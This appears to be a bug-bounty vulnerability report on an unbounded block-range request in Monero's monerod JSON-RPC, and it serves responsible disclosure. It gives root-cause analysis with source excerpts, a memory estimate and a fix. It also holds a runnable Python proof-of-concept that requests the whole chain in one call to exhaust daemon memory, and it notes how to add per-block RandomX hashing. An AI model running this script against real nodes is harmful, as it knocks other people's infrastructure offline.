# `get_block_headers_range` JSON-RPC: the block-count range cap only applies in `--restricted-rpc` mode — a two-integer request can force the daemon to load and serialize its entire blockchain in one response

## Summary

`core_rpc_server::on_get_block_headers_range()` implements the `get_block_headers_range` / `getblockheadersrange` JSON-RPC method. It accepts a `start_height`/`end_height` pair and loops from `start_height` to `end_height` inclusive, fetching and fully deserializing every block in that range from the database and appending a populated `block_header_response` to the in-memory response vector for each one. A cap on the size of this range (`RESTRICTED_BLOCK_HEADER_RANGE = 1000`) exists in the source — but it is applied **only when the request is running in restricted mode** (`if (restricted && ...)`). On a daemon running its **default, unrestricted** RPC configuration, there is no limit on the range size at all: a client can request `start_height = 0, end_height = <current tip>` and the daemon will attempt to load, process, and hold in memory a `block_header_response` for **every block that has ever been mined** — currently well over three million blocks on Monero mainnet — from a single JSON-RPC call whose request body is on the order of 60 bytes.

## Severity

Monero severity: **HIGH** (unauthenticated, default-configuration, single-tiny-request remote memory-exhaustion / CPU-exhaustion denial-of-service against `monerod`).
Suggested CVSS v3.1: `7.5` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`.

Rationale:
1. Reachable via ordinary, unauthenticated JSON-RPC (`/json_rpc`, method `get_block_headers_range`) against a `monerod` running its default (non-`--restricted-rpc`) configuration — the configuration used by any node that has not deliberately opted into the public-facing restricted mode (`AV:N/PR:N/UI:N/AC:L`).
2. The request itself is trivially small and entirely well-formed — two integers — so this is a pure amplification bug: request size is essentially independent of the resulting server-side cost, which instead scales with the size of the entire blockchain.
3. Impact is memory and CPU exhaustion of the daemon process (loading/serializing millions of blocks) — `A:H`, `C:N`, `I:N`.
4. Under `--restricted-rpc` (the documented "safe for public exposure" mode) the existing `RESTRICTED_BLOCK_HEADER_RANGE = 1000` cap fully mitigates this specific vector; this report concerns the unrestricted default, which remains a normal, common, in-scope configuration (local wallet-backing nodes, private infrastructure, and any publicly reachable node not using `--restricted-rpc`).

## Affected Versions

Confirmed present, identically, in both:

- **`master`**, commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` (the actively maintained branch):
  - Handler with restricted-only cap: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.cpp#L2128-L2182
  - `RESTRICTED_BLOCK_HEADER_RANGE` definition: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.cpp#L68
  - JSON-RPC registration (always present, not `_IF`-gated on `!m_restricted`): https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.h#L152-L153
  - `block_header_response` struct (per-entry payload shape): https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server_commands_defs.h#L1146-L1170

- **`v0.18.5.1`**, the latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`:
  - Handler with restricted-only cap: https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/src/rpc/core_rpc_server.cpp#L2547-L2603
  - `RESTRICTED_BLOCK_HEADER_RANGE` definition: https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/src/rpc/core_rpc_server.cpp#L74
  - (v0.18.5.1 additionally contains a `CHECK_PAYMENT_MIN1(req, res, (req.end_height - req.start_height + 1) * COST_PER_BLOCK_HEADER, false)` call at line 2569, part of the optional "RPC payment" anti-spam feature — see Root Cause below for why this provides no protection under the default configuration, and note it has been removed entirely on `master`, leaving no equivalent scaffolding there at all.)

## Root Cause

`src/rpc/core_rpc_server.cpp` (master):
```cpp
bool core_rpc_server::on_get_block_headers_range(const COMMAND_RPC_GET_BLOCK_HEADERS_RANGE::request& req, COMMAND_RPC_GET_BLOCK_HEADERS_RANGE::response& res, epee::json_rpc::error& error_resp, const connection_context *ctx)
{
  RPC_TRACKER(get_block_headers_range);

  const uint64_t bc_height = m_core.get_current_blockchain_height();
  if (req.start_height >= bc_height || req.end_height >= bc_height || req.start_height > req.end_height)
  {
    error_resp.code = CORE_RPC_ERROR_CODE_TOO_BIG_HEIGHT;
    error_resp.message = "Invalid start/end heights.";
    return false;
  }
  const bool restricted = m_restricted && ctx;
  if (restricted && req.end_height - req.start_height > RESTRICTED_BLOCK_HEADER_RANGE)
  {
    error_resp.code = CORE_RPC_ERROR_CODE_RESTRICTED;
    error_resp.message = "Too many block headers requested.";
    return false;
  }

  for (uint64_t h = req.start_height; h <= req.end_height; ++h)
  {
    crypto::hash block_hash = m_core.get_block_id_by_height(h);
    block blk;
    bool have_block = m_core.get_block_by_hash(block_hash, blk);
    ...
    res.headers.push_back(block_header_response());
    bool response_filled = fill_block_header_response(blk, false, block_height, block_hash, res.headers.back(), req.fill_pow_hash && !restricted);
    ...
  }
  res.status = CORE_RPC_STATUS_OK;
  return true;
}
```
The only validation on the *range's size* is `if (restricted && req.end_height - req.start_height > RESTRICTED_BLOCK_HEADER_RANGE)`. As with the sibling bug in this program's other findings, `restricted` is `m_restricted && ctx`, and `m_restricted` is a whole-daemon flag that defaults to `false` — it is only `true` when the operator explicitly passes `--restricted-rpc`. On any ordinary, default-configuration daemon, `restricted` is always `false`, so **the range-size check never fires**, regardless of how large `end_height - start_height` is. The only remaining constraint is `req.end_height < bc_height` (line: `req.end_height >= bc_height` is rejected) — i.e. the range simply cannot exceed the chain's actual current height, but a range spanning **the entire chain from genesis to tip** is fully valid input.

The handler is registered as an ordinary, always-available JSON-RPC method (not conditionally excluded when restricted, unlike several other genuinely sensitive methods in this same file that use `MAP_JON_RPC_WE_IF(..., !m_restricted)`):
```cpp
MAP_JON_RPC_WE("get_block_headers_range", on_get_block_headers_range,    COMMAND_RPC_GET_BLOCK_HEADERS_RANGE)
MAP_JON_RPC_WE("getblockheadersrange",   on_get_block_headers_range,    COMMAND_RPC_GET_BLOCK_HEADERS_RANGE)
```
so this is reachable via the standard `/json_rpc` endpoint on any daemon, restricted or not — only the *behavior* (capped vs. uncapped range) differs.

For every height in the (unbounded, in the default configuration) range, the loop does real, non-trivial work per block: `get_block_id_by_height()` + `get_block_by_hash()` (a full block fetch/deserialize from the database), then `fill_block_header_response()`, which itself performs multiple further database reads per block:
```cpp
// core_rpc_server.cpp — fill_block_header_response body (quoted for completeness)
response.height = height;
response.depth = m_core.get_current_blockchain_height() - height - 1;
response.hash = string_tools::pod_to_hex(hash);
store_difficulty(m_core.get_blockchain_storage().block_difficulty(height),
    response.difficulty, response.wide_difficulty, response.difficulty_top64);
store_difficulty(m_core.get_blockchain_storage().get_db().get_block_cumulative_difficulty(height),
    response.cumulative_difficulty, response.wide_cumulative_difficulty, response.cumulative_difficulty_top64);
response.reward = get_block_reward(blk);
response.block_size = response.block_weight = m_core.get_blockchain_storage().get_db().get_block_weight(height);
response.num_txes = blk.tx_hashes.size();
response.pow_hash = fill_pow_hash ? string_tools::pod_to_hex(get_block_longhash(&(m_core.get_blockchain_storage()), blk, height, 0)) : "";
response.long_term_weight = m_core.get_blockchain_storage().get_db().get_block_long_term_weight(height);
response.miner_tx_hash = string_tools::pod_to_hex(cryptonote::get_transaction_hash(blk.miner_tx));
```
and each populated entry is a `block_header_response`:
```cpp
struct block_header_response
{
    uint8_t major_version;
    uint8_t minor_version;
    uint64_t timestamp;
    std::string prev_hash;
    uint32_t nonce;
    bool orphan_status;
    uint64_t height;
    uint64_t depth;
    std::string hash;
    uint64_t difficulty;
    std::string wide_difficulty;
    uint64_t difficulty_top64;
    uint64_t cumulative_difficulty;
    std::string wide_cumulative_difficulty;
    uint64_t cumulative_difficulty_top64;
    uint64_t reward;
    uint64_t block_size;
    uint64_t block_weight;
    uint64_t num_txes;
    std::string pow_hash;
    uint64_t long_term_weight;
    std::string miner_tx_hash;
    ...
};
```
— six `std::string` fields per entry (`prev_hash`, `hash`, `wide_difficulty`, `wide_cumulative_difficulty`, `pow_hash`, `miner_tx_hash`), three of which (`prev_hash`, `hash`, `miner_tx_hash`) are always 64-character hex hashes that exceed small-string-optimization thresholds on common `std::string` implementations and therefore require individual heap allocations, plus a dozen fixed-size numeric fields.

*(`req.fill_pow_hash` defaults to `false` — `KV_SERIALIZE_OPT(fill_pow_hash, false)` — so an attacker does not even need to opt into computing `pow_hash` (a RandomX hash, expensive per block) to trigger the memory blow-up described here; that field is left as an empty string by default, but the attacker could additionally set `fill_pow_hash: true` to also force a full RandomX computation for every block in the range, compounding this into a severe CPU-exhaustion vector as well — that variant is not required for the memory-exhaustion claim in this report and is noted only as a further aggravation.)*

## Steps to Reproduce

### Static confirmation (what I verified directly)

1. Confirmed the range-size check is gated behind `restricted &&` with no unrestricted-mode equivalent, identically on `master` (`core_rpc_server.cpp:2140`) and `v0.18.5.1` (`core_rpc_server.cpp:2562`).
2. Confirmed the only other bound on the range is `req.end_height < bc_height` (current chain height), which permits `end_height - start_height` up to the entire chain length.
3. Confirmed `get_block_headers_range`/`getblockheadersrange` are registered as always-available JSON-RPC methods (`core_rpc_server.h:152-153`), not restricted-conditionally excluded.
4. Confirmed the per-block work inside the loop (`fill_block_header_response`, `core_rpc_server.cpp` — quoted above) performs multiple additional database reads per block (difficulty, cumulative difficulty, block weight, long-term weight), and confirmed `req.fill_pow_hash` defaults to `false` (`core_rpc_server_commands_defs.h:1751`, `KV_SERIALIZE_OPT(fill_pow_hash, false)`), so the base memory-exhaustion claim does not depend on the attacker requesting RandomX computation.
5. Confirmed `block_header_response`'s field layout (`core_rpc_server_commands_defs.h:1146-1170`) to establish the realistic per-entry memory footprint used in the estimate below.
6. Confirmed `v0.18.5.1`'s equivalent `CHECK_PAYMENT_MIN1(...)` call (line 2569) is a no-op under the default configuration: `check_payment()` returns `true` immediately when `m_rpc_payment == NULL` (the default state unless `--rpc-payment-address` is explicitly configured — `core_rpc_server.cpp:413-416` in v0.18.5.1), and confirmed the entire RPC-payment subsystem has since been removed from `master` (no `rpc_payment`/`CHECK_PAYMENT` symbols remain in `master`'s `core_rpc_server.cpp`), so no equivalent scaffolding exists there at all.

### Rough memory estimate

Each `block_header_response` entry consists of the struct itself (roughly a dozen 8-byte numeric fields plus six `std::string` objects, each `sizeof(std::string)` — typically 32 bytes on common `libstdc++`/`libc++` builds — before counting heap-allocated string contents) plus heap allocations for the three always-64-hex-char hash strings (`prev_hash`, `hash`, `miner_tx_hash`; ~65 bytes of content each, plus per-allocation heap bookkeeping overhead), for a conservative estimate on the order of several hundred bytes to roughly 1 KB of live memory per entry once accounting for the vector's own growth overhead and the subsequent JSON serialization of the whole `res.headers` array into one output string.

At Monero mainnet's current height (in the low millions of blocks, and monotonically growing), a single `{"start_height": 0, "end_height": <current tip>}` request — a JSON-RPC body on the order of 60-100 bytes — would require the daemon to:
- Perform on the order of several million individual database reads (multiple per block: block fetch, difficulty, cumulative difficulty, block weight, long-term weight),
- Hold on the order of several million `block_header_response` entries simultaneously in the `res.headers` vector, and
- Serialize that entire vector into a single JSON response string before any of it is sent to the client,

for a total transient memory footprint plausibly in the multiple-gigabyte range from a request whose body is smaller than a single tweet — an amplification ratio on the order of tens of millions to one, and a computation that would occupy the handling thread (and the underlying LMDB read transaction) for a substantial, chain-height-dependent amount of wall-clock time.

### Suggested dynamic reproduction (not run by me — see disclosure note)

```python
#!/usr/bin/env python3
# poc_get_block_headers_range_full_chain.py
#
# Sends a single get_block_headers_range JSON-RPC request spanning the
# ENTIRE chain (genesis to current tip) to an UNRESTRICTED monerod, to
# demonstrate the unbounded range described in this report.
#
# Usage:
#   python3 poc_get_block_headers_range_full_chain.py <daemon_host> <daemon_port>
#
# Run this only against a disposable/regtest/testnet node, or a mainnet
# node you control and can afford to have consume large memory/CPU for
# the duration of the call, per this program's testing guidelines.

import json
import sys
import time
import urllib.request

def get_height(host, port):
    req = urllib.request.Request(
        f"http://{host}:{port}/json_rpc",
        data=json.dumps({"jsonrpc": "2.0", "id": "0", "method": "get_block_count"}).encode(),
        method="POST", headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read())["result"]["count"]

def main():
    host, port = sys.argv[1], sys.argv[2]
    height = get_height(host, port)
    end_height = height - 1
    print(f"[poc] current chain height reported as {height}; requesting full range 0..{end_height}")

    body = json.dumps({
        "jsonrpc": "2.0", "id": "0", "method": "get_block_headers_range",
        "params": {"start_height": 0, "end_height": end_height, "fill_pow_hash": False},
    }).encode()
    print(f"[poc] request body size: {len(body)} bytes")

    req = urllib.request.Request(
        f"http://{host}:{port}/json_rpc", data=body, method="POST",
        headers={"Content-Type": "application/json"})

    t0 = time.time()
    print("[poc] sending request — observe target daemon's memory/CPU usage now ...")
    with urllib.request.urlopen(req, timeout=3600) as resp:
        data = resp.read()
    print(f"[poc] response received after {time.time()-t0:.1f}s, {len(data)} bytes")

if __name__ == "__main__":
    main()
```

### Expected result on the vulnerable build

Against a `monerod` running its default (non-`--restricted-rpc`) configuration, the request is accepted and processed rather than being rejected with the `"Too many block headers requested."` error that the identical request produces against a `--restricted-rpc` daemon once the range exceeds 1000 blocks. Resident memory usage of the daemon process (observable via `ps`/`top`/`/proc/<pid>/status` `VmRSS`, or a memory profiler) should be observed climbing substantially, proportional to chain height, for the duration of the call, and the call itself should take a meaningfully long, chain-height-proportional amount of wall-clock time to complete — consistent with the estimate above — with the practical outcome, at real mainnet chain height, plausibly being the process being OOM-killed or the request timing out with the daemon left having done multiple gigabytes' worth of allocation and database I/O for no legitimate purpose.

## Possible Solution

Apply the existing `RESTRICTED_BLOCK_HEADER_RANGE` cap (or a separate, more generous but still finite unrestricted-mode constant) unconditionally, regardless of `m_restricted`:
```cpp
if (req.end_height - req.start_height > RESTRICTED_BLOCK_HEADER_RANGE)
{
  error_resp.code = CORE_RPC_ERROR_CODE_RESTRICTED;
  error_resp.message = "Too many block headers requested.";
  return false;
}
```
(replacing `restricted &&` with an unconditional check, or introducing a larger but still bounded ceiling for the unrestricted case if a bigger default range is considered a legitimate use case). This mirrors how every other size-capped RPC in this file should ideally behave: the cap exists to bound legitimate server-side cost, not merely to gate a "trust boundary" that assumes unrestricted access is otherwise harmless — which this bug shows is not the case for a request whose cost scales with total blockchain size rather than with anything the client actually had to prove or pay for.

## Impact

An attacker with no special access — just the ability to send one small, well-formed JSON-RPC request to a `monerod` instance running its default (non-`--restricted-rpc`) RPC configuration — can force that daemon to load, process, and hold in memory a `block_header_response` for every block in the entire blockchain, from a request body of roughly 60-100 bytes. This is an unauthenticated, single-request, near-unbounded (growing with chain height) memory- and CPU-exhaustion denial-of-service vector against any node that has not opted into `--restricted-rpc` — a large, normal population of nodes (all local wallet-backing daemons, private infrastructure, and any publicly reachable node an operator has not deliberately restricted). Because the vector requires no repeated requests, no crafted transactions, and no unusual client behavior beyond a single conforming API call, it is materially easier to trigger than most bulk-request-based amplification bugs.

## Note on AI usage

Source-code analysis (identifying that the `RESTRICTED_BLOCK_HEADER_RANGE` cap in `on_get_block_headers_range()` is gated behind `restricted &&` with no unrestricted-mode equivalent, confirming the JSON-RPC method's unconditional registration, tracing the per-block work performed inside `fill_block_header_response()` and its several additional database reads per block, examining the `block_header_response` struct's field layout to derive a realistic per-entry memory estimate, and confirming that the v0.18.5.1 `CHECK_PAYMENT_MIN1` call is a no-op under the default configuration and has since been removed entirely on `master`) and drafting of this report were done with AI assistance, working directly against the `v0.18.5.1` and `master` source. **This has been verified by static code reading only — every code excerpt quoted above was read directly from the actual current source at the cited file/line. No dynamic reproduction, build, or PoC execution was performed, and no attempt was made to determine Monero mainnet's exact current block height (the report describes the vulnerability's scaling behavior and worst-case order of magnitude rather than asserting a specific live height figure).** The PoC script above has been checked for logical correctness against this exact code path but has not been run against any live daemon. Please run it only against a disposable/regtest or testnet `monerod` instance (or a mainnet node you control and can afford to stress), and attach the observed memory/CPU usage and timing before submitting, per this program's requirement for a working PoC with logs.
